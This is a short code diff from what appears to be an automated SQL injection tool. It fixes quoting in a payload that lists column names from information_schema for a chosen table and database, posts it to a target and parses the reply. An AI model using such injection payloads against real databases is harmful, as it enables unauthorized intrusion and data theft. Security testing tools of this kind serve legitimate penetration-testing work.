@@ -237,7 +237,7 @@ class SqliColumns(SqliTables):
                             #         i) + ",1#", "passwd": "ddog123"}
                             payload = self.dealpayload.construct_normal_payload(select="column_name",
                                                                                 source="information_schema.columns",
-                                                                                conditions="table_name = '" + table_name + " && table_schema = '" + database_name + "'",
+                                                                                conditions="table_name = '" + table_name + "' && table_schema = '" + database_name + "'",
                                                                                 limit=i)
                             r = self.Data.PostData(payload)
                             column_name = UnpackFunction(r)
